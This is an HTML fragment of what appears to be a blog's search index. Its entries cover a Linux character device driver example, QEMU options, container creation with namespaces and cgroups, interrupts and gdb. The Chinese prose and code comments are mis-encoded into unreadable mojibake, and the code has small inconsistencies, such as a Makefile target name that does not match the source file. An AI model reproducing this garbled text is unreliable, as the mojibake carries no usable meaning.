        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-02-jian-dan-de-zi-fu-she-bei-qu-dong/"" data-c="
          &lt;ol&gt;
&lt;li&gt;é©±åŠ¨ä»£ç &lt;/li&gt;
&lt;li&gt;Makefile&lt;/li&gt;
&lt;li&gt;ç¼–è¯‘å’ŒåŠ è½½é©±åŠ¨&lt;/li&gt;
&lt;li&gt;ç¼–å†™åº”ç”¨ç¨‹åºæµ‹è¯•é©±åŠ¨&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;é©±åŠ¨ç¨‹åº&#34;&gt;é©±åŠ¨ç¨‹åº&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// hello.c é©±åŠ¨ç¨‹åº
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/moduleparam.h&amp;gt;
#include &amp;lt;linux/cdev.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/wait.h&amp;gt;
#include &amp;lt;linux/poll.h&amp;gt;
#include &amp;lt;linux/sched.h&amp;gt;
#include &amp;lt;linux/slab.h&amp;gt;

#define BUFFER_MAXÂ  Â  (10)
#define OKÂ  Â  Â  Â  Â  Â  (0)
#define ERRORÂ  Â  Â  Â  Â (-1)

struct cdev *gDev;
struct file_operations *gFile;
dev_tÂ  devNum;
unsigned int subDevNum = 1;
int reg_majorÂ  =Â  232;Â  Â Â  // ä¸»è®¾å¤‡å· æ ‡è¯†ä¸€ç±»è®¾å¤‡
int reg_minor =Â  Â 0;       // æ¬¡è®¾å¤‡å· æ ‡è¯†è¯¥ç±»è®¾å¤‡çš„å“ªä¸ªè®¾å¤‡
char *buffer;

int hello_open(struct inode *p, struct file *f)
{
Â  Â  printk(KERN_INFO &amp;quot;hello_open\r\n&amp;quot;);
Â  Â  return 0;
}

ssize_t hello_write(struct file *f, const char __user *u, size_t s, loff_t *l)
{
Â  Â  printk(KERN_INFO &amp;quot;hello_write\r\n&amp;quot;);
Â  Â  return 0;
}

ssize_t hello_read(struct file *f, char __user *u, size_t s, loff_t *l)
{
Â  Â  printk(KERN_INFO &amp;quot;hello_read\r\n&amp;quot;);Â  Â  Â Â 
Â  Â  return 0;
}

int hello_init(void)
{
Â  Â  devNum = MKDEV(reg_major, reg_minor); // æ ¹æ®ä¸»æ¬¡è®¾å¤‡å·ç”Ÿæˆä¸€ä¸ªè®¾å¤‡å·(ä¸ºä¸€ä¸ªè®¾å¤‡ä¸€ä¸ªè®¾å¤‡å·)
Â  Â  if(OK == register_chrdev_region(devNum, subDevNum, &amp;quot;helloworld&amp;quot;)){  // å°†è¯¥è®¾å¤‡æ³¨å†Œåˆ°å†…æ ¸
Â  Â  Â  Â  printk(KERN_INFO &amp;quot;register_chrdev_region ok \n&amp;quot;);Â 
Â  Â  }else {
Â  Â  printk(KERN_INFO &amp;quot;register_chrdev_region error n&amp;quot;);
Â  Â  Â  Â  return ERROR;
Â  Â  }
Â  Â  printk(KERN_INFO &amp;quot; hello driver init \n&amp;quot;);

Â  Â  gDev = kzalloc(sizeof(struct cdev), GFP_KERNEL);  // ç”³è¯·ä¸€ä¸ªcdevç»“æ„ä½“ï¼Œç”¨äºæè¿°è®¾å¤‡
Â  Â  gFile = kzalloc(sizeof(struct file_operations), GFP_KERNEL); // file_operationsæ˜¯è®¾å¤‡çš„æ“ä½œçš„æŠ½è±¡å‡½æ•°

// ä¸‹é¢å°±æ˜¯å°†è‡ªå®šä¹‰çš„æ“ä½œå‡½æ•°èµ‹äºˆè¯¥è®¾å¤‡çš„æ“ä½œåˆ—è¡¨ä¸­
Â  Â  gFile-&amp;gt;open = hello_open;
Â  Â  gFile-&amp;gt;read = hello_read;
Â  Â  gFile-&amp;gt;write = hello_write;
Â  Â  gFile-&amp;gt;owner = THIS_MODULE;

Â  Â  cdev_init(gDev, gFile); // å»ºç«‹devå’Œæ“ä½œçš„è”ç³»
Â  Â  cdev_add(gDev, devNum, 1); // å»ºç«‹è®¾å¤‡å·å’Œdevç»“æ„ä½“è”ç³»
Â  Â  return 0;
}

void __exit hello_exit(void)
{
Â  printk(KERN_INFO &amp;quot; hello driver exit \n&amp;quot;);
Â  Â  cdev_del(gDev);
Â  Â  kfree(gFile);
Â  Â  kfree(gDev);
Â  Â  unregister_chrdev_region(devNum, subDevNum);
Â  Â  return;
}

module_init(hello_init); // é©±åŠ¨ç¨‹åºçš„å…¥å£å‡½æ•°ï¼Œç›¸å½“äºmainå‡½æ•°ï¼Œå½“insmodå°±ä¼šè°ƒç”¨hello_initå‡½æ•°
module_exit(hello_exit); // å½“rmmodæ—¶ï¼Œè°ƒç”¨hello_exit
MODULE_LICENSE(&amp;quot;GPL&amp;quot;); 
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;makefile&#34;&gt;Makefile&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-makefile&#34;&gt;ifneq ($(KERNELRELEASE),)
    obj-m := helloDev.o
else
PWD := $(shell pwd)
KDIR := /lib/modules/4.4.0-31-generic/build # å†…æ ¸å¤´æ–‡ä»¶çš„ç›®å½•ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªç›®å½•ï¼Œéœ€è¦å®‰è£…å†…æ ¸å¼€å‘åŒ…
#KDIR := /lib/modules/`uname -r`/build
all:
    make -C $(KDIR) M=$(PWD)
clean:
    rm -rf *.o *.ko *.mod.c *.symvers *.c~ *~
endif
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ç¼–è¯‘åŠ è½½é©±åŠ¨&#34;&gt;ç¼–è¯‘åŠ è½½é©±åŠ¨&lt;/h3&gt;
&lt;p&gt;dmesg -c&lt;br&gt;
insmod helloDev.ko&lt;br&gt;
dmesg&lt;/p&gt;
&lt;h3 id=&#34;æµ‹è¯•é©±åŠ¨&#34;&gt;æµ‹è¯•é©±åŠ¨&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/select.h&amp;gt;

#define DATA_NUM Â  Â (64)
int main(int argc, char *argv[])
{
Â  Â int fd, i;
Â  Â int r_len, w_len;
Â  Â fd_set fdset;
Â  Â char buf[DATA_NUM]=&amp;quot;hello world&amp;quot;;
Â  Â memset(buf,0,DATA_NUM);
Â  Â fd = open(&amp;quot;/dev/hello&amp;quot;, O_RDWR);
printf(&amp;quot;%d\r\n&amp;quot;,fd);
Â  Â if(-1 == fd) {
Â  Â  Â  perror(&amp;quot;open file error\r\n&amp;quot;);
return -1;
Â  Â }
else {
printf(&amp;quot;open successe\r\n&amp;quot;);
}
Â  Â 
Â  Â w_len = write(fd,buf, DATA_NUM);
Â  Â r_len = read(fd, buf, DATA_NUM);
Â  Â printf(&amp;quot;%d %d\r\n&amp;quot;, w_len, r_len);
Â  Â printf(&amp;quot;%s\r\n&amp;quot;,buf);

Â  Â return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨è¿è¡Œæµ‹è¯•ç¨‹åºä¹‹å‰ï¼Œå…ˆæ‰‹åŠ¨åœ¨/devåˆ›å»ºè®¾å¤‡æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;mknod /dev/hello c 232 0&lt;/p&gt;
&lt;p&gt;cï¼šå­—ç¬¦è®¾å¤‡&lt;br&gt;
232ï¼šä¸»è®¾å¤‡å·&lt;br&gt;
0ï¼šæ¬¡è®¾å¤‡å·&lt;/p&gt;
&lt;p&gt;ç„¶åå¯ä»¥è¿è¡Œæµ‹è¯•ç¨‹åºè¿›è¡Œæµ‹è¯•ã€‚&lt;/p&gt;
">ã€linuxã€‘å­—ç¬¦è®¾å¤‡é©±åŠ¨</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/xu-ni-hua-qemu/"" data-c="
          &lt;h2 id=&#34;qemu&#34;&gt;qemu&lt;/h2&gt;
&lt;p&gt;qemuæœ¬èº«å¹¶ä¸æ˜¯KVMçš„ä¸€éƒ¨åˆ†ï¼Œå°±æ˜¯ä¸€ä¸ªè‘—åçš„å¼€æºè™šæ‹Ÿæœºè½¯ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;qemuæ˜¯é€šè¿‡çº¯è½¯ä»¶æ¥ä»¿çœŸx86å¹³å°å¤„ç†å™¨çš„å–æŒ‡ã€è§£ç å’Œæ‰§è¡Œï¼ŒæŒ‡ä»¤å¹¶ä¸ä¼šåœ¨ç‰©ç†å¹³å°ä¸Šç›´æ¥æ‰§è¡Œï¼Œå› æ­¤æ€§èƒ½æ¯”è¾ƒå·®ï¼Œä½†å¯ä»¥æ¨¡æ‹Ÿä¸åŒæ¶æ„å¹³å°çš„è™šæ‹Ÿæœºã€‚&lt;/p&gt;
&lt;h3 id=&#34;qemuçš„ä½¿ç”¨&#34;&gt;qemuçš„ä½¿ç”¨&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# å®‰è£…
apt install qemu-system-x86

# åˆ›å»ºç¡¬ç›˜
qemu-img create disk.img 20G

# åˆ†é…ç‰©ç†å…‰é©±
qemu-system-x86_64 disk.img -cdrom ***.iso

# é…ç½®CPU
-smp n[,maxcpus=cpus][,cores=cores][,threads=threads][,sockets=sockets]
# n ç”¨äºè®¾ç½®å®¢æˆ·æœºä¸­ä½¿ç”¨çš„é€»è¾‘CPUæ•°é‡ï¼Œé»˜è®¤=1ï¼›
# maxcpus ç”¨äºè®¾ç½®å®¢æˆ·æœºä¸­æœ€å¤§å¯èƒ½è¢«ä½¿ç”¨çš„CPUæ•°é‡ï¼ŒåŒ…æ‹¬çƒ­æ’æ‹”hot-plugåŠ å…¥CPU
# cores ç”¨äºè®¾ç½®æ¯ä¸ªCPU socketä¸Šçš„coresæ•°é‡ï¼Œé»˜è®¤=1
# threadsç”¨äºè®¾ç½®æ¯ä¸ªCPUcoreä¸Šçš„çº¿ç¨‹æ•°ï¼Œé»˜è®¤=1
# socketsç”¨äºè®¾ç½®å®¢æˆ·æœºä¸­çœ‹åˆ°çš„æ€»çš„CPU socketæ•°é‡
#  é€šè¿‡-cpu ?å‚æ•°è®¾å®šè™šæ‹Ÿæœºä¸­ä½¿ç”¨çš„å¤„ç†å™¨å‹å·
# ä¾‹å¦‚ qemu-system-x86_64 -smp 2,sockets=2,cores=2,threads=2 -cpu core2duo ...

# é…ç½®å†…å­˜
qemu -m 1024
qemu -m 2G
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ç½‘ç»œé…ç½®&#34;&gt;ç½‘ç»œé…ç½®&lt;/h3&gt;
&lt;p&gt;ç½‘ç»œé…ç½®è¾ƒä¸ºå¤æ‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-net nic[,vlan=n][,macaddr=mac][,model=type][,name=str][,addr=str][,vectors=v]
-net user[,vlan=n][,name=str][,net=addr[/mask]][,host=addr][,restrict=on|off]
         [,hostname=host][,dhcpstart=addr][,dns=addr][,dnssearch=domain][,tftp=dir]
         [,bootfile=f][,hostfwd=rule][,guestfwd=rule][,smb=dir[,smbserver=addr]]
-net tap[,vlan=n][,name=str][,fd=h][,fds=x:y:...:z][,ifname=name][,script=file][,downscript=dfile][,helper=helper][,sndbuf=nbytes][,vnet_hdr=on|off][,vhost=on|off][,vhostfd=h][,vhostfds=x:y:...:z][,vhostforce=on|off][,queues=n]
-net bridge[,vlan=n][,name=str][,br=bridge][,helper=helper]
//......
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸å…¶ä»–è™šæ‹Ÿæœºç±»ä¼¼ï¼Œæ”¯æŒ4ç§ç½‘å¡ç±»å‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ¡¥æ¥&lt;br&gt;
åŸºäºç½‘æ¡¥çš„è™šæ‹Ÿç½‘å¡ï¼Œåœ¨ä¸»æœºçš„ç½‘å¡ä¸Šå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿç½‘æ¡¥ï¼Œç„¶åå†è™šæ‹Ÿç½‘æ¡¥ä¸Šåˆ›å»ºè™šæ‹Ÿçš„ç½‘å¡ï¼ŒæŠŠåˆ›å»ºå¥½çš„è™šæ‹Ÿç½‘å¡åˆ†é…ç»™qemuå®¢æˆ·æœºä½¿ç”¨ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# apt-get install bridge-utils
# brctl addbr br0    # æ·»åŠ bridge br0
# brctl addif br0 eth0 # å°†br0 ä¸eth0 ç»‘å®š
# brctl stp br0 on    # å°†br0è®¾ç½®ä¸ºSTPåè®®
# ifconfig eth0 0     # å°†eth0 çš„IPè®¾ç½®ä¸º0ï¼Œå› ä¸ºeth0å·²ç»å·¥ä½œåœ¨é“¾è·¯å±‚ï¼Œä¸éœ€è¦IP
# dhclient br0       # è®¾ç½®br0å‚æ•°
# route            # æŸ¥çœ‹è·¯ç”±è¡¨

# ç„¶åå°†è™šæ‹Ÿæœºç½‘å¡tapåˆ†é…ç»™å®¢æˆ·æœº
qemu-system-x86_64 -hda disk.img -m 2G -net nic -net tap,ifname=tap1,script=/etc/qemu-ifup,downscript=no
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœå®¢æˆ·æœºç½‘å¡è®¾ç½®æˆdhcpæ¨¡å¼çš„ï¼Œä¼šå‘ç°å®¢æˆ·æœºçš„IPåœ°å€ä¸ä¸»æœºçš„IPåœ°å€åœ¨åŒä¸€ä¸ªç½‘æ®µä¸Šã€‚&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;NAT&lt;/li&gt;
&lt;li&gt;å†…éƒ¨ç½‘ç»œ&lt;/li&gt;
&lt;li&gt;ç›´æ¥åˆ†é…å®¿ä¸»æœºçš„ç‰©ç†ç½‘å¡&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;qemuå‚æ•°&#34;&gt;qemuå‚æ•°&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;å‚æ•°&lt;/th&gt;
&lt;th&gt;è¯´æ˜&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-M vexpress-a9&lt;/td&gt;
&lt;td&gt;æŒ‡å®šè¦ä»¿çœŸçš„å¼€å‘æ¿ï¼švexpress-a9&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-m 512M&lt;/td&gt;
&lt;td&gt;æŒ‡å®šDRAMå†…å­˜å¤§å°ä¸º512MB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-cpu cortex-a9&lt;/td&gt;
&lt;td&gt;æŒ‡å®šCPUæ¶æ„&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-smp n&lt;/td&gt;
&lt;td&gt;CPUçš„ä¸ªæ•°ï¼Œä¸è®¾ç½®çš„è¯ï¼Œé»˜è®¤æ˜¯1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-kernel ./zImage&lt;/td&gt;
&lt;td&gt;è¦è¿è¡Œçš„å†…æ ¸é•œåƒ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-dtb ./vexpress-vap-ca9.dtb&lt;/td&gt;
&lt;td&gt;è¦åŠ è½½çš„è®¾å¤‡æ ‘æ–‡ä»¶&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-append cmdline&lt;/td&gt;
&lt;td&gt;è®¾ç½®Linuxå†…æ ¸å‘½ä»¤è¡Œã€å¯åŠ¨å‚æ•°&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-initrd file&lt;/td&gt;
&lt;td&gt;ä½¿ç”¨fileæ–‡ä»¶ä½œä¸ºåˆå§‹åŒ–ram disk&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-nographic&lt;/td&gt;
&lt;td&gt;éå›¾å½¢åŒ–å¯åŠ¨ï¼Œä½¿ç”¨ä¸²å£ä½œä¸ºæ§åˆ¶å°&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-sd rootfs.ext3&lt;/td&gt;
&lt;td&gt;ä½¿ç”¨rootfs.ext3ä½œä¸ºSDå¡é•œåƒæ–‡ä»¶&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-net nic&lt;/td&gt;
&lt;td&gt;åˆ›å»ºä¸€ä¸ªç½‘å¡&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-net nic -net tap&lt;/td&gt;
&lt;td&gt;å°†å¼€å‘æ¿ç½‘å¡å’Œä¸»æœºç½‘å¡å»ºç«‹æ¡¥æ¥(Bridge)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;re&#34;&gt;re&lt;/h3&gt;
&lt;p&gt;https://www.zhaixue.cc/qemu/qemu-intro.html&lt;/p&gt;
">ã€è™šæ‹ŸåŒ–ã€‘qemu</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/rong-qi-01-rong-qi-de-chuang-jian-yuan-li/"" data-c="
          &lt;p&gt;å®¹å™¨=cgroup(èµ„æºæ§åˆ¶)+namespace(è®¿é—®éš”ç¦»)+rootfs(æ–‡ä»¶ç³»ç»Ÿéš”ç¦»)+å®¹å™¨å¼•æ“(ç”Ÿå‘½å‘¨æœŸæ§åˆ¶)&lt;/p&gt;
&lt;h2 id=&#34;å®¹å™¨çš„åˆ›å»ºåŸç†&#34;&gt;å®¹å™¨çš„åˆ›å»ºåŸç†&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;åˆ›å»ºè¿›ç¨‹&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;pid = clone(fun, stack, flags, clone_arg);
(flags: CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWPIC | CLONE_NEWUTS | ...)
&lt;/code&gt;&lt;/pre&gt;
é€šè¿‡cloneç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶ä¼ å…¥å„ä¸ªnamespaceå¯¹åº”çš„clone flagï¼Œåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å­è¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹ç”¨ç”¨è‡ªå·±çš„pidã€mountã€userã€netã€ipcã€uts namespaceã€‚&lt;/li&gt;
&lt;li&gt;è®¾å®šcgroup&lt;br&gt;
ç®€å•çš„è¯´ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„cgroupå°±æ˜¯åœ¨cgroupfsçš„æŒ‚è½½ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹ï¼Œå› ä¸ºcgroupåˆ†äº†ä¸åŒçš„subsystemï¼ŒæŒ‚è½½åœ¨ä¸åŒçš„ç›®å½•ä¸‹ï¼Œæ‰€ä»¥åœ¨æ¯ä¸ªç›®å½•ä¸‹éƒ½åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹ï¼Œå°†è¿›ç¨‹çš„pidå†™è¿›å»ã€‚&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/cpu/tasks
echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/cpuset/tasks
echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/blkio/tasks
echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/memory/tasks
echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/devices/tasks
echo &amp;amp;pid &amp;gt; /sys/fs/cgroup/freezer/tasks
&lt;/code&gt;&lt;/pre&gt;
å°†è¿›ç¨‹pidå†™å…¥å„ä¸ªcgroupå­ç³»ç»Ÿä¸­ã€‚&lt;/li&gt;
&lt;li&gt;åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;fun()
{
    ...
    pivot_root(&amp;quot;path_of_rootfs/&amp;quot;, path);
    ...
    exec(&amp;quot;bin/bash&amp;quot;);
    ...
}
&lt;/code&gt;&lt;/pre&gt;
è¯¥funå‡½æ•°ç”±ä¸Šé¢ç”Ÿæˆçš„æ–°è¿›ç¨‹æ‰§è¡Œï¼Œåœ¨funå‡½æ•°ä¸­ï¼Œé€šè¿‡pivot_rootç³»ç»Ÿè°ƒç”¨ï¼Œä½¿è¿›ç¨‹è¿›å…¥ä¸€ä¸ªæ–°çš„rootfsï¼Œä¹‹åé€šè¿‡è¿›å…¥ä¸€ä¸ªæ–°çš„rootfsï¼Œä¹‹åé€šè¿‡execç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨æ–°çš„namespaceã€cgroupã€rootfsä¸­æ‰§è¡Œ&amp;quot;/bin/bash&amp;quot;ç¨‹åºã€‚&lt;/li&gt;
&lt;/ol&gt;
">ã€å®¹å™¨ã€‘å®¹å™¨çš„åˆ›å»ºåŸç†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-zhong-duan-guan-li/"" data-c="
          &lt;h2 id=&#34;ä¸­æ–­ç®¡ç†æœºåˆ¶&#34;&gt;ä¸­æ–­ç®¡ç†æœºåˆ¶&lt;/h2&gt;
&lt;h2 id=&#34;ç¡¬ä»¶ä¸­æ–­å·å’Œlinuxä¸­æ–­å·çš„æ˜ å°„&#34;&gt;ç¡¬ä»¶ä¸­æ–­å·å’Œlinuxä¸­æ–­å·çš„æ˜ å°„&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;è™šæ‹Ÿä¸­æ–­å·&lt;br&gt;
ä¹Ÿç§°ä¸ºè½¯ä»¶ä¸­æ–­å·&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç¡¬ä»¶ä¸­æ–­å·&lt;br&gt;
ä¸€èˆ¬æŒ‡çš„æ˜¯ç¡¬ä»¶æ¥å£çš„ç¼–å·æ‰€å¯¹åº”çš„ä¸­æ–­å·ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è½¯ä»¶ä¸­æ–­å·å’Œç¡¬ä»¶ä¸­æ–­å·æœ‰ä¸€ä¸ªæ˜ å°„å…³ç³»ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ³¨å†Œä¸­æ–­&#34;&gt;æ³¨å†Œä¸­æ–­&lt;/h2&gt;
&lt;p&gt;å½“ä¸€ä¸ªå¤–è®¾ä¸­æ–­å‘ç”Ÿåï¼Œ&lt;/p&gt;
">ã€linuxã€‘ä¸­æ–­ç®¡ç†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-strace-xi-tong-diao-yong-gen-zong-gong-ju/"" data-c="
          &lt;h3 id=&#34;gdb&#34;&gt;gdb&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;ç®€è¿°&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gdbæ˜¯gccçš„è°ƒè¯•å·¥å…·ï¼Œå®ƒä¸»è¦ç”±cå’Œc++ç¼–å†™çš„åº”ç”¨ç¨‹åº&lt;/li&gt;
&lt;li&gt;åŠŸèƒ½ååˆ†å¼ºå¤§
&lt;ul&gt;
&lt;li&gt;å¯åŠ¨ç¨‹åºï¼Œå¯æŒ‰ç”¨æˆ·è‡ªå®šä¹‰è¦æ±‚éšå¿ƒæ‰€æ¬²è¿è¡Œç¨‹åº&lt;/li&gt;
&lt;li&gt;å¯ä»¥è®©è¢«è°ƒè¯•çš„ç¨‹åºåœ¨æŒ‡å®šç«¯ç‚¹åœä½&lt;/li&gt;
&lt;li&gt;å½“ç¨‹åºè¢«åœä½æ—¶ï¼Œå¯ä»¥æ£€æŸ¥æ­¤æ—¶ç¨‹åºä¸­è¿è¡ŒçŠ¶æ€&lt;/li&gt;
&lt;li&gt;åŠ¨æ€çš„æ”¹å˜ç¨‹åºçš„è¿è¡Œç¯å¢ƒ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;è¦è°ƒè¯•C/C++ç¨‹åºï¼Œéœ€è¦åœ¨ç¼–è¯‘æ—¶å°†è°ƒè¯•ä¿¡æ¯åŠ å…¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œä½¿ç”¨ç¼–è¯‘å™¨çš„-gå‚æ•°å¯å®Œæˆ&lt;/li&gt;
&lt;li&gt;å¯åŠ¨gdbçš„æ–¹æ³•
&lt;ul&gt;
&lt;li&gt;gdb program
&lt;ul&gt;
&lt;li&gt;programæ˜¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸€èˆ¬åœ¨å½“å‰ç›®å½•ä¸‹&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;gdb program core
&lt;ul&gt;
&lt;li&gt;ç”¨gdbåŒæ—¶è°ƒè¯•ä¸€ä¸ªè¿è¡Œç¨‹åºå’Œcoreæ–‡ä»¶ï¼Œcoreæ˜¯ç¨‹åºéæ³•æ‰§è¡Œåcore dumpåäº§ç”Ÿçš„æ–‡ä»¶&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;gdb program 1234
&lt;ul&gt;
&lt;li&gt;å¦‚æœç¨‹åºæ˜¯ä¸€ä¸ªæœåŠ¡ç¨‹åºï¼Œé‚£ä¹ˆå¯ä»¥æŒ‡å®šè¿™ä¸ªæœåŠ¡ç¨‹åºè¿è¡Œæ—¶çš„è¿›ç¨‹IDï¼Œgdbä¼šè‡ªåŠ¨è¿›è¡Œattachæ“ä½œï¼Œå¹¶è°ƒè¯•è¿™ä¸ªç¨‹åº&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;å¸¸è§ç”¨æ³•&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç¤ºä¾‹ä»£ç &lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;//test.cpp
#include&amp;lt;iostream&amp;gt;
using namespace std;
 
int fun(int n)
{
    int res = 0;
    for(int i=1;i&amp;lt;=n;i++)
        res+=i;
    return res;
}
 
int main()
{
    int arr[10];
    arr[0]=0;
    arr[1]=1;
    for(int i=2;i&amp;lt;10;i++)
    {
        arr[i]=arr[i-1]+arr[i-2];
    }
    cout&amp;lt;&amp;lt;&amp;quot;arr[9]&amp;quot;&amp;lt;&amp;lt;arr[9]&amp;lt;&amp;lt;endl;
    cout&amp;lt;&amp;lt;&amp;quot;fun(9)&amp;quot;&amp;lt;&amp;lt;fun(9)&amp;lt;&amp;lt;endl;
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘ç¨‹åº&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;g++ -g -o test test.cpp
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨gdbè°ƒè¯•ç¨‹åº&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb test
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;å‚æ•°ä½¿ç”¨å¸®åŠ©
&lt;ul&gt;
&lt;li&gt;lï¼Œåˆ—å‡ºå‡½æ•°ä»£ç åŠå…¶è¡Œæ•°&lt;/li&gt;
&lt;li&gt;b 16ï¼Œåœ¨ä»£ç 16å¤„è®¾ç½®æ–­ç‚¹&lt;/li&gt;
&lt;li&gt;b funï¼Œåœ¨å‡½æ•°funå¤„è®¾ç½®æ–­ç‚¹&lt;/li&gt;
&lt;li&gt;info breakï¼ŒæŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯&lt;/li&gt;
&lt;li&gt;rï¼Œè¿è¡Œç¨‹åº&lt;/li&gt;
&lt;li&gt;nï¼Œå•æ¡æ‰§è¡Œè¯­å¥&lt;/li&gt;
&lt;li&gt;p iï¼Œæ‰“å°iå˜é‡çš„å€¼&lt;/li&gt;
&lt;li&gt;btï¼ŒæŸ¥çœ‹å‡½æ•°çš„å †æ ˆ&lt;/li&gt;
&lt;li&gt;finishï¼Œé€€å‡ºå‡½æ•°&lt;/li&gt;
&lt;li&gt;qï¼Œç»“æŸè°ƒè¯•&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627828521264.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ä½¿ç”¨gdbåˆ†æcoredumpæ–‡ä»¶&lt;/p&gt;
&lt;ul&gt;
